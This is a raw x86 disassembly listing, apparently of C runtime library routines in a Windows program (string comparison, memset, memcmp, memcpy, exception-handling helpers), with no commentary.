  427a8b:	push   edi
  427a8c:	call   DWORD PTR ds:0x4290f8
  427a92:	test   eax,eax
  427a94:	je     0x427a9e
  427a96:	mov    DWORD PTR ds:0x45ddc0,edi
  427a9c:	jmp    0x427ab3
  427a9e:	call   DWORD PTR ds:0x429044
  427aa4:	cmp    eax,0x78
  427aa7:	jne    0x427ab3
  427aa9:	mov    DWORD PTR ds:0x45ddc0,0x2
  427ab3:	mov    eax,ds:0x45ddc0
  427ab8:	cmp    eax,0x2
  427abb:	je     0x427bab
  427ac1:	cmp    eax,esi
  427ac3:	je     0x427bab
  427ac9:	cmp    eax,0x1
  427acc:	jne    0x427bd1
  427ad2:	mov    DWORD PTR [ebp-0x20],esi
  427ad5:	mov    DWORD PTR [ebp-0x24],esi
  427ad8:	cmp    DWORD PTR [ebp+0x18],esi
  427adb:	jne    0x427ae5
  427add:	mov    eax,ds:0x45ddb4
  427ae2:	mov    DWORD PTR [ebp+0x18],eax
  427ae5:	push   esi
  427ae6:	push   esi
  427ae7:	push   DWORD PTR [ebp+0x10]
  427aea:	push   DWORD PTR [ebp+0xc]
  427aed:	xor    eax,eax
  427aef:	cmp    DWORD PTR [ebp+0x20],esi
  427af2:	setne  al
  427af5:	lea    eax,[eax*8+0x1]
  427afc:	push   eax
  427afd:	push   DWORD PTR [ebp+0x18]
  427b00:	call   DWORD PTR ds:0x4290ec
  427b06:	mov    edi,eax
  427b08:	mov    DWORD PTR [ebp-0x28],edi
  427b0b:	test   edi,edi
  427b0d:	je     0x427bd1
  427b13:	and    DWORD PTR [ebp-0x4],0x0
  427b17:	lea    ebx,[edi+edi*1]
  427b1a:	mov    eax,ebx
  427b1c:	add    eax,0x3
  427b1f:	and    eax,0xfffffffc
  427b22:	call   0x425390
  427b27:	mov    DWORD PTR [ebp-0x18],esp
  427b2a:	mov    esi,esp
  427b2c:	mov    DWORD PTR [ebp-0x2c],esi
  427b2f:	push   ebx
  427b30:	push   0x0
  427b32:	push   esi
  427b33:	call   0x427c40
  427b38:	add    esp,0xc
  427b3b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b3f:	jmp    0x427b56
  427b41:	xor    eax,eax
  427b43:	inc    eax
  427b44:	ret    
  427b45:	mov    esp,DWORD PTR [ebp-0x18]
  427b48:	call   0x4287d5
  427b4d:	xor    esi,esi
  427b4f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b53:	mov    edi,DWORD PTR [ebp-0x28]
  427b56:	test   esi,esi
  427b58:	jne    0x427b71
  427b5a:	push   edi
  427b5b:	push   0x2
  427b5d:	call   0x426458
  427b62:	pop    ecx
  427b63:	pop    ecx
  427b64:	mov    esi,eax
  427b66:	test   esi,esi
  427b68:	je     0x427bd1
  427b6a:	mov    DWORD PTR [ebp-0x24],0x1
  427b71:	push   edi
  427b72:	push   esi
  427b73:	push   DWORD PTR [ebp+0x10]
  427b76:	push   DWORD PTR [ebp+0xc]
  427b79:	push   0x1
  427b7b:	push   DWORD PTR [ebp+0x18]
  427b7e:	call   DWORD PTR ds:0x4290ec
  427b84:	test   eax,eax
  427b86:	je     0x427b99
  427b88:	push   DWORD PTR [ebp+0x14]
  427b8b:	push   eax
  427b8c:	push   esi
  427b8d:	push   DWORD PTR [ebp+0x8]
  427b90:	call   DWORD PTR ds:0x4290f8
  427b96:	mov    DWORD PTR [ebp-0x20],eax
  427b99:	cmp    DWORD PTR [ebp-0x24],0x0
  427b9d:	je     0x427ba6
  427b9f:	push   esi
  427ba0:	call   0x425f4a
  427ba5:	pop    ecx
  427ba6:	mov    eax,DWORD PTR [ebp-0x20]
  427ba9:	jmp    0x427c19
  427bab:	mov    ebx,DWORD PTR [ebp+0x1c]
  427bae:	cmp    ebx,esi
  427bb0:	jne    0x427bb8
  427bb2:	mov    ebx,DWORD PTR ds:0x45dda4
  427bb8:	mov    edi,DWORD PTR [ebp+0x18]
  427bbb:	test   edi,edi
  427bbd:	jne    0x427bc5
  427bbf:	mov    edi,DWORD PTR ds:0x45ddb4
  427bc5:	push   ebx
  427bc6:	call   0x4285bd
  427bcb:	pop    ecx
  427bcc:	cmp    eax,0xffffffff
  427bcf:	jne    0x427bd5
  427bd1:	xor    eax,eax
  427bd3:	jmp    0x427c19
  427bd5:	cmp    eax,edi
  427bd7:	je     0x427bf7
  427bd9:	push   0x0
  427bdb:	push   0x0
  427bdd:	lea    ecx,[ebp+0x10]
  427be0:	push   ecx
  427be1:	push   DWORD PTR [ebp+0xc]
  427be4:	push   eax
  427be5:	push   edi
  427be6:	call   0x428606
  427beb:	add    esp,0x18
  427bee:	mov    esi,eax
  427bf0:	test   esi,esi
  427bf2:	je     0x427bd1
  427bf4:	mov    DWORD PTR [ebp+0xc],esi
  427bf7:	push   DWORD PTR [ebp+0x14]
  427bfa:	push   DWORD PTR [ebp+0x10]
  427bfd:	push   DWORD PTR [ebp+0xc]
  427c00:	push   DWORD PTR [ebp+0x8]
  427c03:	push   ebx
  427c04:	call   DWORD PTR ds:0x4290f4
  427c0a:	mov    edi,eax
  427c0c:	test   esi,esi
  427c0e:	je     0x427c17
  427c10:	push   esi
  427c11:	call   0x425f4a
  427c16:	pop    ecx
  427c17:	mov    eax,edi
  427c19:	lea    esp,[ebp-0x38]
  427c1c:	call   0x42537b
  427c21:	ret    
  427c22:	mov    eax,ds:0x45ddc4
  427c27:	test   eax,eax
  427c29:	je     0x427c3a
  427c2b:	push   DWORD PTR [esp+0x4]
  427c2f:	call   eax
  427c31:	test   eax,eax
  427c33:	pop    ecx
  427c34:	je     0x427c3a
  427c36:	xor    eax,eax
  427c38:	inc    eax
  427c39:	ret    
  427c3a:	xor    eax,eax
  427c3c:	ret    
  427c3d:	int3   
  427c3e:	int3   
  427c3f:	int3   
  427c40:	mov    edx,DWORD PTR [esp+0xc]
  427c44:	mov    ecx,DWORD PTR [esp+0x4]
  427c48:	test   edx,edx
  427c4a:	je     0x427c9b
  427c4c:	xor    eax,eax
  427c4e:	mov    al,BYTE PTR [esp+0x8]
  427c52:	push   edi
  427c53:	mov    edi,ecx
  427c55:	cmp    edx,0x4
  427c58:	jb     0x427c8b
  427c5a:	neg    ecx
  427c5c:	and    ecx,0x3
  427c5f:	je     0x427c6d
  427c61:	sub    edx,ecx
  427c63:	mov    BYTE PTR [edi],al
  427c65:	add    edi,0x1
  427c68:	sub    ecx,0x1
  427c6b:	jne    0x427c63
  427c6d:	mov    ecx,eax
  427c6f:	shl    eax,0x8
  427c72:	add    eax,ecx
  427c74:	mov    ecx,eax
  427c76:	shl    eax,0x10
  427c79:	add    eax,ecx
  427c7b:	mov    ecx,edx
  427c7d:	and    edx,0x3
  427c80:	shr    ecx,0x2
  427c83:	je     0x427c8b
  427c85:	rep stos DWORD PTR es:[edi],eax
  427c87:	test   edx,edx
  427c89:	je     0x427c95
  427c8b:	mov    BYTE PTR [edi],al
  427c8d:	add    edi,0x1
  427c90:	sub    edx,0x1
  427c93:	jne    0x427c8b
  427c95:	mov    eax,DWORD PTR [esp+0x8]
  427c99:	pop    edi
  427c9a:	ret    
  427c9b:	mov    eax,DWORD PTR [esp+0x4]
  427c9f:	ret    
  427ca0:	push   esi
  427ca1:	mov    esi,DWORD PTR [esp+0x8]
  427ca5:	test   esi,esi
  427ca7:	je     0x427e2e
  427cad:	push   DWORD PTR [esi+0x4]
  427cb0:	call   0x425f4a
  427cb5:	push   DWORD PTR [esi+0x8]
  427cb8:	call   0x425f4a
  427cbd:	push   DWORD PTR [esi+0xc]
  427cc0:	call   0x425f4a
  427cc5:	push   DWORD PTR [esi+0x10]
  427cc8:	call   0x425f4a
  427ccd:	push   DWORD PTR [esi+0x14]
  427cd0:	call   0x425f4a
  427cd5:	push   DWORD PTR [esi+0x18]
  427cd8:	call   0x425f4a
  427cdd:	push   DWORD PTR [esi]
  427cdf:	call   0x425f4a
  427ce4:	push   DWORD PTR [esi+0x20]
  427ce7:	call   0x425f4a
  427cec:	push   DWORD PTR [esi+0x24]
  427cef:	call   0x425f4a
  427cf4:	push   DWORD PTR [esi+0x28]
  427cf7:	call   0x425f4a
  427cfc:	push   DWORD PTR [esi+0x2c]
  427cff:	call   0x425f4a
  427d04:	push   DWORD PTR [esi+0x30]
  427d07:	call   0x425f4a
  427d0c:	push   DWORD PTR [esi+0x34]
  427d0f:	call   0x425f4a
  427d14:	push   DWORD PTR [esi+0x1c]
  427d17:	call   0x425f4a
  427d1c:	push   DWORD PTR [esi+0x38]
  427d1f:	call   0x425f4a
  427d24:	push   DWORD PTR [esi+0x3c]
  427d27:	call   0x425f4a
  427d2c:	add    esp,0x40
  427d2f:	push   DWORD PTR [esi+0x40]
  427d32:	call   0x425f4a
  427d37:	push   DWORD PTR [esi+0x44]
  427d3a:	call   0x425f4a
  427d3f:	push   DWORD PTR [esi+0x48]
  427d42:	call   0x425f4a
  427d47:	push   DWORD PTR [esi+0x4c]
  427d4a:	call   0x425f4a
  427d4f:	push   DWORD PTR [esi+0x50]
  427d52:	call   0x425f4a
  427d57:	push   DWORD PTR [esi+0x54]
  427d5a:	call   0x425f4a
  427d5f:	push   DWORD PTR [esi+0x58]
  427d62:	call   0x425f4a
  427d67:	push   DWORD PTR [esi+0x5c]
  427d6a:	call   0x425f4a
  427d6f:	push   DWORD PTR [esi+0x60]
  427d72:	call   0x425f4a
  427d77:	push   DWORD PTR [esi+0x64]
  427d7a:	call   0x425f4a
  427d7f:	push   DWORD PTR [esi+0x68]
  427d82:	call   0x425f4a
  427d87:	push   DWORD PTR [esi+0x6c]
  427d8a:	call   0x425f4a
  427d8f:	push   DWORD PTR [esi+0x70]
  427d92:	call   0x425f4a
  427d97:	push   DWORD PTR [esi+0x74]
  427d9a:	call   0x425f4a
  427d9f:	push   DWORD PTR [esi+0x78]
  427da2:	call   0x425f4a
  427da7:	push   DWORD PTR [esi+0x7c]
  427daa:	call   0x425f4a
  427daf:	add    esp,0x40
  427db2:	push   DWORD PTR [esi+0x80]
  427db8:	call   0x425f4a
  427dbd:	push   DWORD PTR [esi+0x84]
  427dc3:	call   0x425f4a
  427dc8:	push   DWORD PTR [esi+0x88]
  427dce:	call   0x425f4a
  427dd3:	push   DWORD PTR [esi+0x8c]
  427dd9:	call   0x425f4a
  427dde:	push   DWORD PTR [esi+0x90]
  427de4:	call   0x425f4a
  427de9:	push   DWORD PTR [esi+0x94]
  427def:	call   0x425f4a
  427df4:	push   DWORD PTR [esi+0x98]
  427dfa:	call   0x425f4a
  427dff:	push   DWORD PTR [esi+0x9c]
  427e05:	call   0x425f4a
  427e0a:	push   DWORD PTR [esi+0xa0]
  427e10:	call   0x425f4a
  427e15:	push   DWORD PTR [esi+0xa4]
  427e1b:	call   0x425f4a
  427e20:	push   DWORD PTR [esi+0xa8]
  427e26:	call   0x425f4a
  427e2b:	add    esp,0x2c
  427e2e:	pop    esi
  427e2f:	ret    
  427e30:	push   esi
  427e31:	mov    esi,DWORD PTR [esp+0x8]
  427e35:	test   esi,esi
  427e37:	je     0x427e8d
  427e39:	mov    eax,DWORD PTR [esi]
  427e3b:	mov    ecx,DWORD PTR ds:0x45d934
  427e41:	cmp    eax,DWORD PTR [ecx]
  427e43:	je     0x427e54
  427e45:	cmp    eax,DWORD PTR ds:0x45d904
  427e4b:	je     0x427e54
  427e4d:	push   eax
  427e4e:	call   0x425f4a
  427e53:	pop    ecx
  427e54:	mov    eax,DWORD PTR [esi+0x4]
  427e57:	mov    ecx,DWORD PTR ds:0x45d934
  427e5d:	cmp    eax,DWORD PTR [ecx+0x4]
  427e60:	je     0x427e71
  427e62:	cmp    eax,DWORD PTR ds:0x45d908
  427e68:	je     0x427e71
  427e6a:	push   eax
  427e6b:	call   0x425f4a
  427e70:	pop    ecx
  427e71:	mov    esi,DWORD PTR [esi+0x8]
  427e74:	mov    eax,ds:0x45d934
  427e79:	cmp    esi,DWORD PTR [eax+0x8]
  427e7c:	je     0x427e8d
  427e7e:	cmp    esi,DWORD PTR ds:0x45d90c
  427e84:	je     0x427e8d
  427e86:	push   esi
  427e87:	call   0x425f4a
  427e8c:	pop    ecx
  427e8d:	pop    esi
  427e8e:	ret    
  427e8f:	push   esi
  427e90:	mov    esi,DWORD PTR [esp+0x8]
  427e94:	test   esi,esi
  427e96:	je     0x427f66
  427e9c:	mov    eax,DWORD PTR [esi+0xc]
  427e9f:	mov    ecx,DWORD PTR ds:0x45d934
  427ea5:	cmp    eax,DWORD PTR [ecx+0xc]
  427ea8:	je     0x427eb9
  427eaa:	cmp    eax,DWORD PTR ds:0x45d910
  427eb0:	je     0x427eb9
  427eb2:	push   eax
  427eb3:	call   0x425f4a
  427eb8:	pop    ecx
  427eb9:	mov    eax,DWORD PTR [esi+0x10]
  427ebc:	mov    ecx,DWORD PTR ds:0x45d934
  427ec2:	cmp    eax,DWORD PTR [ecx+0x10]
  427ec5:	je     0x427ed6
  427ec7:	cmp    eax,DWORD PTR ds:0x45d914
  427ecd:	je     0x427ed6
  427ecf:	push   eax
  427ed0:	call   0x425f4a
  427ed5:	pop    ecx
  427ed6:	mov    eax,DWORD PTR [esi+0x14]
  427ed9:	mov    ecx,DWORD PTR ds:0x45d934
  427edf:	cmp    eax,DWORD PTR [ecx+0x14]
  427ee2:	je     0x427ef3
  427ee4:	cmp    eax,DWORD PTR ds:0x45d918
  427eea:	je     0x427ef3
  427eec:	push   eax
  427eed:	call   0x425f4a
  427ef2:	pop    ecx
  427ef3:	mov    eax,DWORD PTR [esi+0x18]
  427ef6:	mov    ecx,DWORD PTR ds:0x45d934
  427efc:	cmp    eax,DWORD PTR [ecx+0x18]
  427eff:	je     0x427f10
  427f01:	cmp    eax,DWORD PTR ds:0x45d91c
  427f07:	je     0x427f10
  427f09:	push   eax
  427f0a:	call   0x425f4a
  427f0f:	pop    ecx
  427f10:	mov    eax,DWORD PTR [esi+0x1c]
  427f13:	mov    ecx,DWORD PTR ds:0x45d934
  427f19:	cmp    eax,DWORD PTR [ecx+0x1c]
  427f1c:	je     0x427f2d
  427f1e:	cmp    eax,DWORD PTR ds:0x45d920
  427f24:	je     0x427f2d
  427f26:	push   eax
  427f27:	call   0x425f4a
  427f2c:	pop    ecx
  427f2d:	mov    eax,DWORD PTR [esi+0x20]
  427f30:	mov    ecx,DWORD PTR ds:0x45d934
  427f36:	cmp    eax,DWORD PTR [ecx+0x20]
  427f39:	je     0x427f4a
  427f3b:	cmp    eax,DWORD PTR ds:0x45d924
  427f41:	je     0x427f4a
  427f43:	push   eax
  427f44:	call   0x425f4a
  427f49:	pop    ecx
  427f4a:	mov    esi,DWORD PTR [esi+0x24]
  427f4d:	mov    eax,ds:0x45d934
  427f52:	cmp    esi,DWORD PTR [eax+0x24]
  427f55:	je     0x427f66
  427f57:	cmp    esi,DWORD PTR ds:0x45d928
  427f5d:	je     0x427f66
  427f5f:	push   esi
  427f60:	call   0x425f4a
  427f65:	pop    ecx
  427f66:	pop    esi
  427f67:	ret    
  427f68:	int3   
  427f69:	int3   
  427f6a:	int3   
  427f6b:	int3   
  427f6c:	int3   
  427f6d:	int3   
  427f6e:	int3   
  427f6f:	int3   
  427f70:	push   ebp
  427f71:	mov    ebp,esp
  427f73:	push   esi
  427f74:	xor    eax,eax
  427f76:	push   eax
  427f77:	push   eax
  427f78:	push   eax
  427f79:	push   eax
  427f7a:	push   eax
  427f7b:	push   eax
  427f7c:	push   eax
  427f7d:	push   eax
  427f7e:	mov    edx,DWORD PTR [ebp+0xc]
  427f81:	lea    ecx,[ecx+0x0]
  427f84:	mov    al,BYTE PTR [edx]
  427f86:	or     al,al
  427f88:	je     0x427f93
  427f8a:	add    edx,0x1
  427f8d:	bts    DWORD PTR [esp],eax
  427f91:	jmp    0x427f84
  427f93:	mov    esi,DWORD PTR [ebp+0x8]
  427f96:	or     ecx,0xffffffff
  427f99:	lea    ecx,[ecx+0x0]
  427f9c:	add    ecx,0x1
  427f9f:	mov    al,BYTE PTR [esi]
  427fa1:	or     al,al
  427fa3:	je     0x427fae
  427fa5:	add    esi,0x1
  427fa8:	bt     DWORD PTR [esp],eax
  427fac:	jae    0x427f9c
  427fae:	mov    eax,ecx
  427fb0:	add    esp,0x20
  427fb3:	pop    esi
  427fb4:	leave  
  427fb5:	ret    
  427fb6:	int3   
  427fb7:	int3   
  427fb8:	int3   
  427fb9:	int3   
  427fba:	int3   
  427fbb:	int3   
  427fbc:	int3   
  427fbd:	int3   
  427fbe:	int3   
  427fbf:	int3   
  427fc0:	mov    edx,DWORD PTR [esp+0x4]
  427fc4:	mov    ecx,DWORD PTR [esp+0x8]
  427fc8:	test   edx,0x3
  427fce:	jne    0x42800c
  427fd0:	mov    eax,DWORD PTR [edx]
  427fd2:	cmp    al,BYTE PTR [ecx]
  427fd4:	jne    0x428004
  427fd6:	or     al,al
  427fd8:	je     0x428000
  427fda:	cmp    ah,BYTE PTR [ecx+0x1]
  427fdd:	jne    0x428004
  427fdf:	or     ah,ah
  427fe1:	je     0x428000
  427fe3:	shr    eax,0x10
  427fe6:	cmp    al,BYTE PTR [ecx+0x2]
  427fe9:	jne    0x428004
  427feb:	or     al,al
  427fed:	je     0x428000
  427fef:	cmp    ah,BYTE PTR [ecx+0x3]
  427ff2:	jne    0x428004
  427ff4:	add    ecx,0x4
  427ff7:	add    edx,0x4
  427ffa:	or     ah,ah
  427ffc:	jne    0x427fd0
  427ffe:	mov    edi,edi
  428000:	xor    eax,eax
  428002:	ret    
  428003:	nop
  428004:	sbb    eax,eax
  428006:	shl    eax,1
  428008:	add    eax,0x1
  42800b:	ret    
  42800c:	test   edx,0x1
  428012:	je     0x42802c
  428014:	mov    al,BYTE PTR [edx]
  428016:	add    edx,0x1
  428019:	cmp    al,BYTE PTR [ecx]
  42801b:	jne    0x428004
  42801d:	add    ecx,0x1
  428020:	or     al,al
  428022:	je     0x428000
  428024:	test   edx,0x2
  42802a:	je     0x427fd0
  42802c:	mov    ax,WORD PTR [edx]
  42802f:	add    edx,0x2
  428032:	cmp    al,BYTE PTR [ecx]
  428034:	jne    0x428004
  428036:	or     al,al
  428038:	je     0x428000
  42803a:	cmp    ah,BYTE PTR [ecx+0x1]
  42803d:	jne    0x428004
  42803f:	or     ah,ah
  428041:	je     0x428000
  428043:	add    ecx,0x2
  428046:	jmp    0x427fd0
  428048:	int3   
  428049:	int3   
  42804a:	int3   
  42804b:	int3   
  42804c:	int3   
  42804d:	int3   
  42804e:	int3   
  42804f:	int3   
  428050:	mov    eax,DWORD PTR [esp+0xc]
  428054:	test   eax,eax
  428056:	je     0x4280a2
  428058:	mov    edx,DWORD PTR [esp+0x4]
  42805c:	push   esi
  42805d:	push   edi
  42805e:	mov    esi,edx
  428060:	mov    edi,DWORD PTR [esp+0x10]
  428064:	or     edx,edi
  428066:	and    edx,0x3
  428069:	je     0x4280a3
  42806b:	test   eax,0x1
  428070:	je     0x428083
  428072:	mov    cl,BYTE PTR [esi]
  428074:	cmp    cl,BYTE PTR [edi]
  428076:	jne    0x4280d0
  428078:	add    esi,0x1
  42807b:	add    edi,0x1
  42807e:	sub    eax,0x1
  428081:	je     0x4280a0
  428083:	mov    cl,BYTE PTR [esi]
  428085:	mov    dl,BYTE PTR [edi]
  428087:	cmp    cl,dl
  428089:	jne    0x4280d0
  42808b:	mov    cl,BYTE PTR [esi+0x1]
  42808e:	mov    dl,BYTE PTR [edi+0x1]
  428091:	cmp    cl,dl
  428093:	jne    0x4280d0
  428095:	add    edi,0x2
  428098:	add    esi,0x2
  42809b:	sub    eax,0x2
  42809e:	jne    0x428083
  4280a0:	pop    edi
  4280a1:	pop    esi
  4280a2:	ret    
  4280a3:	mov    ecx,eax
  4280a5:	and    eax,0x3
  4280a8:	shr    ecx,0x2
  4280ab:	je     0x4280d8
  4280ad:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280af:	je     0x4280d8
  4280b1:	mov    ecx,DWORD PTR [esi-0x4]
  4280b4:	mov    edx,DWORD PTR [edi-0x4]
  4280b7:	cmp    cl,dl
  4280b9:	jne    0x4280cb
  4280bb:	cmp    ch,dh
  4280bd:	jne    0x4280cb
  4280bf:	shr    ecx,0x10
  4280c2:	shr    edx,0x10
  4280c5:	cmp    cl,dl
  4280c7:	jne    0x4280cb
  4280c9:	cmp    ch,dh
  4280cb:	mov    eax,0x0
  4280d0:	sbb    eax,eax
  4280d2:	pop    edi
  4280d3:	sbb    eax,0xffffffff
  4280d6:	pop    esi
  4280d7:	ret    
  4280d8:	test   eax,eax
  4280da:	je     0x4280a0
  4280dc:	mov    edx,DWORD PTR [esi]
  4280de:	mov    ecx,DWORD PTR [edi]
  4280e0:	cmp    dl,cl
  4280e2:	jne    0x4280cb
  4280e4:	sub    eax,0x1
  4280e7:	je     0x428105
  4280e9:	cmp    dh,ch
  4280eb:	jne    0x4280cb
  4280ed:	sub    eax,0x1
  4280f0:	je     0x428105
  4280f2:	and    ecx,0xff0000
  4280f8:	and    edx,0xff0000
  4280fe:	cmp    edx,ecx
  428100:	jne    0x4280cb
  428102:	sub    eax,0x1
  428105:	pop    edi
  428106:	pop    esi
  428107:	ret    
  428108:	int3   
  428109:	int3   
  42810a:	int3   
  42810b:	int3   
  42810c:	int3   
  42810d:	int3   
  42810e:	int3   
  42810f:	int3   
  428110:	push   ebp
  428111:	mov    ebp,esp
  428113:	push   edi
  428114:	push   esi
  428115:	push   ebx
  428116:	mov    ecx,DWORD PTR [ebp+0x10]
  428119:	jecxz  0x428142
  42811b:	mov    ebx,ecx
  42811d:	mov    edi,DWORD PTR [ebp+0x8]
  428120:	mov    esi,edi
  428122:	xor    eax,eax
  428124:	repnz scas al,BYTE PTR es:[edi]
  428126:	neg    ecx
  428128:	add    ecx,ebx
  42812a:	mov    edi,esi
  42812c:	mov    esi,DWORD PTR [ebp+0xc]
  42812f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428131:	mov    al,BYTE PTR [esi-0x1]
  428134:	xor    ecx,ecx
  428136:	cmp    al,BYTE PTR [edi-0x1]
  428139:	ja     0x428140
  42813b:	je     0x428142
  42813d:	sub    ecx,0x2
  428140:	not    ecx
  428142:	mov    eax,ecx
  428144:	pop    ebx
  428145:	pop    esi
  428146:	pop    edi
  428147:	leave  
  428148:	ret    
  428149:	int3   
  42814a:	int3   
  42814b:	int3   
  42814c:	int3   
  42814d:	int3   
  42814e:	int3   
  42814f:	int3   
  428150:	push   ebp
  428151:	mov    ebp,esp
  428153:	push   esi
  428154:	xor    eax,eax
  428156:	push   eax
  428157:	push   eax
  428158:	push   eax
  428159:	push   eax
  42815a:	push   eax
  42815b:	push   eax
  42815c:	push   eax
  42815d:	push   eax
  42815e:	mov    edx,DWORD PTR [ebp+0xc]
  428161:	lea    ecx,[ecx+0x0]
  428164:	mov    al,BYTE PTR [edx]
  428166:	or     al,al
  428168:	je     0x428173
  42816a:	add    edx,0x1
  42816d:	bts    DWORD PTR [esp],eax
  428171:	jmp    0x428164
  428173:	mov    esi,DWORD PTR [ebp+0x8]
  428176:	mov    edi,edi
  428178:	mov    al,BYTE PTR [esi]
  42817a:	or     al,al
  42817c:	je     0x42818a
  42817e:	add    esi,0x1
  428181:	bt     DWORD PTR [esp],eax
  428185:	jae    0x428178
  428187:	lea    eax,[esi-0x1]
  42818a:	add    esp,0x20
  42818d:	pop    esi
  42818e:	leave  
  42818f:	ret    
  428190:	push   ebp
  428191:	mov    ebp,esp
  428193:	push   ebx
  428194:	push   esi
  428195:	push   edi
  428196:	push   ebp
  428197:	push   0x0
  428199:	push   0x0
  42819b:	push   0x4281a8
  4281a0:	push   DWORD PTR [ebp+0x8]
  4281a3:	call   0x428c1e
  4281a8:	pop    ebp
  4281a9:	pop    edi
  4281aa:	pop    esi
  4281ab:	pop    ebx
  4281ac:	mov    esp,ebp
  4281ae:	pop    ebp
  4281af:	ret    
  4281b0:	mov    ecx,DWORD PTR [esp+0x4]
  4281b4:	test   DWORD PTR [ecx+0x4],0x6
  4281bb:	mov    eax,0x1
  4281c0:	je     0x4281d1
  4281c2:	mov    eax,DWORD PTR [esp+0x8]
  4281c6:	mov    edx,DWORD PTR [esp+0x10]
  4281ca:	mov    DWORD PTR [edx],eax
  4281cc:	mov    eax,0x3
  4281d1:	ret    
  4281d2:	push   ebx
  4281d3:	push   esi
  4281d4:	push   edi
  4281d5:	mov    eax,DWORD PTR [esp+0x10]
  4281d9:	push   eax
  4281da:	push   0xfffffffe
  4281dc:	push   0x4281b0
  4281e1:	push   DWORD PTR fs:0x0
  4281e8:	mov    DWORD PTR fs:0x0,esp
  4281ef:	mov    eax,DWORD PTR [esp+0x20]
  4281f3:	mov    ebx,DWORD PTR [eax+0x8]
  4281f6:	mov    esi,DWORD PTR [eax+0xc]
  4281f9:	cmp    esi,0xffffffff
  4281fc:	je     0x42822c
  4281fe:	cmp    esi,DWORD PTR [esp+0x24]
  428202:	je     0x42822c
  428204:	lea    esi,[esi+esi*2]
  428207:	mov    ecx,DWORD PTR [ebx+esi*4]
  42820a:	mov    DWORD PTR [esp+0x8],ecx
  42820e:	mov    DWORD PTR [eax+0xc],ecx
  428211:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428216:	jne    0x42822a
  428218:	push   0x101
  42821d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428221:	call   0x428266
  428226:	call   DWORD PTR [ebx+esi*4+0x8]
  42822a:	jmp    0x4281ef
  42822c:	pop    DWORD PTR fs:0x0
  428233:	add    esp,0xc
  428236:	pop    edi
  428237:	pop    esi
  428238:	pop    ebx
  428239:	ret    
  42823a:	xor    eax,eax
  42823c:	mov    ecx,DWORD PTR fs:0x0
  428243:	cmp    DWORD PTR [ecx+0x4],0x4281b0
  42824a:	jne    0x42825c
  42824c:	mov    edx,DWORD PTR [ecx+0xc]
  42824f:	mov    edx,DWORD PTR [edx+0xc]
  428252:	cmp    DWORD PTR [ecx+0x8],edx
  428255:	jne    0x42825c
  428257:	mov    eax,0x1
  42825c:	ret    
  42825d:	push   ebx
  42825e:	push   ecx
  42825f:	mov    ebx,0x45d94c
  428264:	jmp    0x428270
  428266:	push   ebx
  428267:	push   ecx
  428268:	mov    ebx,0x45d94c
  42826d:	mov    ecx,DWORD PTR [ebp+0x8]
  428270:	mov    DWORD PTR [ebx+0x8],ecx
  428273:	mov    DWORD PTR [ebx+0x4],eax
  428276:	mov    DWORD PTR [ebx+0xc],ebp
  428279:	pop    ecx
  42827a:	pop    ebx
  42827b:	ret    0x4
  42827e:	int3   
  42827f:	int3   
  428280:	push   ebp
  428281:	mov    ebp,esp
  428283:	push   edi
  428284:	push   esi
  428285:	mov    esi,DWORD PTR [ebp+0xc]
  428288:	mov    ecx,DWORD PTR [ebp+0x10]
  42828b:	mov    edi,DWORD PTR [ebp+0x8]
  42828e:	mov    eax,ecx
  428290:	mov    edx,ecx
  428292:	add    eax,esi
  428294:	cmp    edi,esi
  428296:	jbe    0x4282a0
  428298:	cmp    edi,eax
  42829a:	jb     0x42841c
  4282a0:	test   edi,0x3
  4282a6:	jne    0x4282bc
  4282a8:	shr    ecx,0x2
  4282ab:	and    edx,0x3
  4282ae:	cmp    ecx,0x8
  4282b1:	jb     0x4282dc
  4282b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282b5:	jmp    DWORD PTR [edx*4+0x4283cc]
  4282bc:	mov    eax,edi
  4282be:	mov    edx,0x3
  4282c3:	sub    ecx,0x4
  4282c6:	jb     0x4282d4
  4282c8:	and    eax,0x3
  4282cb:	add    ecx,eax
  4282cd:	jmp    DWORD PTR [eax*4+0x4282e0]
  4282d4:	jmp    DWORD PTR [ecx*4+0x4283dc]
  4282db:	nop
  4282dc:	jmp    DWORD PTR [ecx*4+0x428360]
  4282e3:	nop
  4282e4:	lock add BYTE PTR [edx+0x0],0x1c
  4282e9:	add    DWORD PTR [edx+0x0],0x40
  4282ed:	add    DWORD PTR [edx+0x0],0x23
  4282f1:	ror    DWORD PTR [edx-0x75f877fa],1
  4282f7:	inc    esi
  4282f8:	add    DWORD PTR [eax+0x468a0147],ecx
  4282fe:	add    al,cl
  428300:	jmp    0x28a0b07
  428305:	add    esi,0x3
  428308:	add    edi,0x3
  42830b:	cmp    ecx,0x8
  42830e:	jb     0x4282dc
  428310:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428312:	jmp    DWORD PTR [edx*4+0x4283cc]
  428319:	lea    ecx,[ecx+0x0]
  42831c:	and    edx,ecx
  42831e:	mov    al,BYTE PTR [esi]
  428320:	mov    BYTE PTR [edi],al
  428322:	mov    al,BYTE PTR [esi+0x1]
  428325:	shr    ecx,0x2
  428328:	mov    BYTE PTR [edi+0x1],al
  42832b:	add    esi,0x2
  42832e:	add    edi,0x2
  428331:	cmp    ecx,0x8
  428334:	jb     0x4282dc
  428336:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428338:	jmp    DWORD PTR [edx*4+0x4283cc]
  42833f:	nop
  428340:	and    edx,ecx
  428342:	mov    al,BYTE PTR [esi]
  428344:	mov    BYTE PTR [edi],al
  428346:	add    esi,0x1
  428349:	shr    ecx,0x2
  42834c:	add    edi,0x1
  42834f:	cmp    ecx,0x8
  428352:	jb     0x4282dc
  428354:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428356:	jmp    DWORD PTR [edx*4+0x4283cc]
  42835d:	lea    ecx,[ecx+0x0]
  428360:	ret    
  428361:	add    DWORD PTR [edx+0x0],0xffffffb0
  428365:	add    DWORD PTR [edx+0x0],0xffffffa8
  428369:	add    DWORD PTR [edx+0x0],0xffffffa0
  42836d:	add    DWORD PTR [edx+0x0],0xffffff98
  428371:	add    DWORD PTR [edx+0x0],0xffffff90
  428375:	add    DWORD PTR [edx+0x0],0xffffff88
